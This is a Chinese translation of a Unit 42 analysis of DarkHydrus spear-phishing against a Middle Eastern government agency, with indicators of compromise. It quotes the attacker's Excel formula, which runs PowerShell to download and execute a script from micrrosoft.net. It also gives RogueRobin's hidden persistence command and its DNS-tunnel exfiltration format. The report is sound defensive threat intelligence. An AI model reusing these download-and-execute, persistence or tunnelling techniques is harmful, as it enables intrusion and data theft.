> 原文链接: https://www.anquanke.com//post/id/154024 


# DarkHydrus针对中东政府发起攻击详情分析


                                阅读量   
                                **153002**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：paloaltonetworks.com
                                <br>原文地址：[https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/](https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t018dc9f4aa11e032f2.jpg)](https://p4.ssl.qhimg.com/t018dc9f4aa11e032f2.jpg)

在2018年7月， Unit42分析了针对中东政府机构的新型文件类型的攻击行为， 此次攻击由未公布的威胁组织DarkHydrus执行。基于关联分析可知，该组织自2016年初开始就使用目前的样本版本。这次攻击与先前攻击有所不同，此次钓鱼的电子邮件中附件为有密码保护的RAR压缩包，解压后可发现恶意web查询文件（.iqy）。<br>
.iqy文件是包含URL的简单文本文件，默认情况下由Excel打开。 打开后，Excel将检索文件中所有的URL对象。在以往的案例中，载体多为开源合法工具，但这些工具被搭载了恶意代码以进行恶意行为，例如Meterpreter和Cobalt Strike。该组织此次使用了基于PowerShell的自定义有效载荷，我们将之称为RogueRobin。



## 攻击方式

攻击者在7月15日到16日之间发送了鱼叉式网络钓鱼电子邮件。每封电子邮件都有一个受密码保护的RAR压缩包，名为credential.rar。 如图1所示，消息正文用阿拉伯语编写，要求收件人解压RAR压缩包并查看其中名为credential.iqy的文档，该消息同时附录了打开RAR存档所需的密码123456。<br>[![](https://p2.ssl.qhimg.com/t01a213d21faf81ca58.png)](https://p2.ssl.qhimg.com/t01a213d21faf81ca58.png)<br>
翻译这些阿拉伯文，文本含义为：<br>
你好<br>
请查看附件<br>
密码：123456



## 恶意载荷分析

恶意载荷credential.iqy的SHA256为：<br>
cc1966eff7bed11c1faada0bb0ed0c8715404abd936cfa816cef61863a0c1dd6<br>
该.iqy文件只包含以下字符串文本：<br>[http://micrrosoft.net/releasenotes.txt](http://micrrosoft.net/releasenotes.txt)<br>
Microsoft Excel打开.iqy文件后使用文件中的URL来获取要包含在电子表格中的远程数据。 默认情况下，Excel不允许从远程服务器下载数据，会通过显示对话框询问用户的同意：<br>[![](https://p4.ssl.qhimg.com/t0120dc276ad1c6c0c2.png)](https://p4.ssl.qhimg.com/t0120dc276ad1c6c0c2.png)<br>
通过启用此数据连接，用户允许Excel从.iqy文件中的URL里获取内容。<br>
releasenotes.txt文件（SHA256：bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d）中的内容包含以下公式，Excel将其保存到工作表中的“A0”单元格。公式为：<br>
=cmd|’ /c C:WindowsSystem32WindowsPowerShellv1.0powershell.exe -nop -exec bypass -c IEX ((New-Object Net.WebClient).DownloadString(”[http://micrrosoft.net/winupdate.ps1″))’!A0](http://micrrosoft.net/winupdate.ps1%22))'!A0)<br>
该公式使用命令语句运行PowerShell脚本，该脚本尝试下载并执行在URL： http：// micrrosoft .net / winupdate.ps1上托管的第二个PowerShell脚本。 默认情况下，Excel不会直接执行命令，但会在用户同意后通过以下对话框后执行此操作：<br>[![](https://p3.ssl.qhimg.com/t01c3b4fb289964c30e.png)](https://p3.ssl.qhimg.com/t01c3b4fb289964c30e.png)<br>
winupdate.ps1脚本（SHA256：36862f654c3356d2177b5d35a410c78ff9803d1d7d20da0b82e3d69d640e856e）就是我们称之为RogueRobin的负责进行攻击的主要恶意载荷。 它的开发人员使用开源的Invoke-Obfuscation工具来搭载这个PowerShell脚本，特别还使用了Invoke-Obfuscation提供的COMPRESS技术。 解压缩的PowerShell载荷与PowerShell Empire代理有一些相似之处，例如使用抖动值和作业ID引用命令，但是我们没有确凿的证据证明此工具的作者使用Empire作为其工具的基础。<br>
在执行其功能之前，有效负载会检查它是否能在沙箱中执行。 该载荷使用WMI查询并且检查运行进程，以获取脚本可能在分析环境中执行的证据。 具体的沙盒检查包括：<br>
使用WMI检查VBOX，bochs，qemu，virtualbox和vm的BIOS版本（SMBIOSBIOSVERSION）。<br>
使用WMI检查BIOS制造商是否有XEN。<br>
使用WMI检查总物理内存是否小于2900000000。<br>
使用WMI检查CPU核心数是否小于或等于1。<br>
枚举“Wireshark”和“Sysinternals”的运行流程。<br>
如果恶意载荷不能在沙箱中运行，它将尝试将自身安装到系统以永久执行。 为了下载此载荷，脚本将创建文件％APPDATA％ OneDrive.bat并将以下字符串保存到其中：<br>
powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%OneDrive.ps1”<br>
然后，该脚本将自身的修改后的副本写入％APPDATA％ OneDrive.ps1，并省略执行此安装的代码。 为了在系统启动时持续执行，脚本将在Windows启动文件夹中创建以下快捷方式，该启动文件夹将在每次用户登录时运行OneDrive.ps1脚本：<br>
$env:SystemDriveUsers$env:USERNAMEAppDataRoamingMicrosoftWindowsStart MenuProgramsStartupOneDrive.lnk<br>
恶意载荷使用自定义的DNS隧道协议与其配置命令和进行控制（C2）的服务器进行通信。 本载荷中配置的域名为：<br>
Anyconnect[.]stream<br>
Bigip[.]stream<br>
Fortiweb[.]download<br>
Kaspersky[.]science<br>
microtik[.]stream<br>
owa365[.]bid<br>
symanteclive[.]download<br>
windowsdefender[.]win<br>
DNS隧道协议可以使用多种不同的DNS查询类型与C2服务器进行交互。 恶意载荷会进行前期测试以查看哪些DNS查询类型能够成功连接到C2服务器。 它将遍历列表，第一个能够从C2服务器接收响应的DNS类型将用于载荷和C2服务器之间的所有通信，顺序如下：<br>
A<br>
AAAA<br>
AC<br>
CNAME<br>
MX<br>
TXT<br>
SRV<br>
SOA<br>
恶意载荷使用具有特定参数的内置Windows nslookup应用程序和特制的子域来与C2通信。 为了与C2建立通信，有效载荷将首先获得C2服务器发布的系统特定标识符。 载荷使用以下结构发送初始DNS，以获取系统特定标识符查询，其中包括当前进程标识符（PID）作为C2域的子域：&lt;current process id&gt;.&lt;c2 domain&gt;<br>[![](https://p2.ssl.qhimg.com/t01db5e4b5ae13fc7d5.png)](https://p2.ssl.qhimg.com/t01db5e4b5ae13fc7d5.png)<br>
一旦获得系统标识符，恶意载荷就收集系统特定信息并将其发送到C2服务器。 收集的信息整合到统一规格的字符串中：

&lt;IP地址&gt; | &lt;计算机名称&gt; | &lt;域&gt; | &lt;用户名&gt; | &lt;isAdmin标志&gt; | &lt;来自config的hasGarbage标志&gt; | &lt;来自config的hasStartup标志&gt; | &lt;来自config“hybrid”模式标志&gt; | &lt;来自config的sleep interval &gt; | &lt;来自config的jitter值&gt;<br>
载荷将对此字符串进行base64编码，并使用其DNS隧道协议将数据传输到C2。隧道协议通过发送一系列DNS查询语句来传输数据，这些数据被包含在C2域的子域内。每个发出的DNS请求结构如下：<br>
&lt;系统ID&gt; – &lt;作业ID&gt; – &lt;数据中的偏移&gt; &lt;更多数据标记&gt; – &lt; 被base64编码的且长度随机的数据(30到42个字符之间)&gt;.&lt;c2 域名&gt;

载荷将针对这些出站请求来搜索不同的响应，这些均是基于载荷与C2通信的DNS请求的类型来进行判断的。 以下显示了C2用于传输成功或取消消息的特定IP地址或字符串，具体取决于与C2进行通信的DNS查询类型：<br>[![](https://p0.ssl.qhimg.com/t0101181fbeb7bfb0a0.png)](https://p0.ssl.qhimg.com/t0101181fbeb7bfb0a0.png)<br>
在提供系统特定信息之后，此载荷将与C2服务器进行交互以获取命令并将其称为作业（jobs）。 C2服务器将提供一个字符串，有效载荷将根据这个字符串去确定基于命令处理程序所要执行的命令。 为了能获取被作为命令处理的字符串，载荷将发出一系列DNS询问语句以解析具有以下结构的域：<br>
&lt;系统 id&gt; – &lt;作业ID&gt; – &lt;作业独有的偏移数据&gt;.&lt;c2 域&gt;<br>
C2服务器将对这些包含在IPv4或IPv6地址中的询问的进行响应，具体取决于载荷用于与其C2服务器进行通信的DNS查询的类型。 载荷将根据不同的DNS询问类型使用特定的正则表达式，如表2所示：<br>[![](https://p3.ssl.qhimg.com/t0114e3ccb2cd10c4d6.png)](https://p3.ssl.qhimg.com/t0114e3ccb2cd10c4d6.png)<br>
这些正则表达式用于构建字符串，然后载荷将受其命令处理程序的指派进行操作。 我们分析了有效负载以确定可用的命令，这些命令提供了各种远程控制的功能。命令字符串如表3所示：<br>[![](https://p4.ssl.qhimg.com/t01b5ae4260df147c39.png)](https://p4.ssl.qhimg.com/t01b5ae4260df147c39.png)



## 活动分析

每个域名都模仿了现有技术厂商的合法域名，安全厂商尤甚。<br>
Anyconnect[.]stream<br>
Bigip[.]stream<br>
Fortiweb[.]download<br>
Kaspersky[.]science<br>
microtik[.]stream<br>
owa365[.]bid<br>
symanteclive[.]download<br>
windowsdefender[.]win<br>
这些C2服务器解析出来的IP地址均出自中国的1.2.9.0/24，这个地址是C2服务器用于向终端系统发送取消通信消息的IP地址。每个列出的域都使用ns102.kaspersky [.] host和ns103.kaspersky [.] host作为其命名服务器。 通过对ns102 / ns103.kaspersky [.]host进行检查，发现二级域名kaspersky [.]host是非法的，实际上不归卡巴斯基实验室所有。 kaspersky [.]host关联出可疑IP：107.175.150 [.] 113和94.130.88 [.] 9。而94.130.88 [.] 9又可以关联出0utlook [.] bid和hotmai1 [.] com。我们暂时还不知道这些域的具体作用，但基于域名欺骗和共享IP的相似性等特点，它们可能是攻击者用以进行攻击的基础设施的一部分。107.175.150 [.] 113关联出另一个域名qu.edu.qa.0utl00k [.] net。<br>
我们基于此C2服务器找到一个恶意文档（SHA256：d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318），文档中包含与之前分析的恶意行为类似的PowerShell脚本。通过对0utl00k [.] net的二级域名进行搜索可以关联出IP：195.154.41 [.] 150。此IP包含另两个相关域名：allexa [.] net和cisc0 [.] net。通过查询cisc0 [.] net，可以发现有几个武器化文档和恶意载荷从2017年中后期开始就使用这个域作为C2。<br>
ClearSky Security表示cisc0 [.] net可能与Copy Kittens组织有关，虽然无法实锤，但是他们所使用的技术和攻击对象都十分相似。有关Copy Kittens的更多信息可以在题为Operation Wilted Tulip的文章中找到。<br>
ClearSky Security报告地址为：[https://www.clearskysec.com/wp-content/uploads/2018/01/ClearSky_cyber_intelligence_report_2017.pdf](https://www.clearskysec.com/wp-content/uploads/2018/01/ClearSky_cyber_intelligence_report_2017.pdf)

Operation Wilted Tulip文章地址为：[https://www.clearskysec.com/wpcontent/uploads/2017/07/Operation_Wilted_Tulip.pdf](https://www.clearskysec.com/wpcontent/uploads/2017/07/Operation_Wilted_Tulip.pdf)<br>
C2服务器在很长一段时间内被该组织重复使用。例如2017年1月和7月的攻击事件中除了两个载荷之外，也使用了micrrosoft [.] net这个域名。该组织主要使用免费工具或Meterpreter，Mimikatz，PowerShellEmpire，Veil和CobaltStrike等开源软件库来利用被武器化的Microsoft Office文档。这些文档通常不包含恶意代码，而是会对包含恶意代码的远控文件进行检索。



## 结论

DarkHydrus小组利用恶意.iqy文件对至少一个中东政府机构进行了攻击。 .iqy文件利用的是Excel下载电子表格中所包含的远程服务器内容的机制。 DarkHydrus利用这种不起眼的文件格式来运行命令，最终安装PowerShell脚本以获得对系统的后门访问。 当前提供的PowerShell后门是暂时是由恶意组织定制开发的，但是DarkHydrus可能会通过使用合法开源工具将这些功能拼凑在一起。<br>
（译者尽量直译，部分按个人从业经历进行了意译，但很多地方仍有很多不合适的地方，若存在疑问请阅读原文）



## IOC

载荷的SHA256：<br>
cec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1<br>
ac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4<br>
a547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88<br>
d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda<br>
dd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffa<br>
b2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81<br>
c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3<br>
ce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd00<br>
99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c<br>
d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318<br>
8063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde<br>
9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49<br>
cf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f9<br>
0a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc1<br>
0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82<br>
870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8<br>
ff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb0<br>
01fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e2<br>
6dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a<br>
47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870<br>
776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4<br>
cf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0<br>
e88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc678<br>
26e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245<br>
b5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350<br>
ad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771c<br>
相关域名：<br>
maccaffe[.]com<br>
cisc0[.]net<br>
0utl00k[.]net<br>
msdncss[.]com<br>
0ffice[.]com<br>
0ffiice[.]com<br>
micrrosoft[.]net<br>
anyconnect[.]stream<br>
bigip[.]stream<br>
fortiweb[.]download<br>
kaspersky[.]science<br>
microtik[.]stream<br>
owa365[.]bid<br>
symanteclive[.]download<br>
windowsdefender[.]win<br>
allexa[.]net<br>
kaspersky[.]host<br>
hotmai1[.]com<br>
0utlook[.]bid
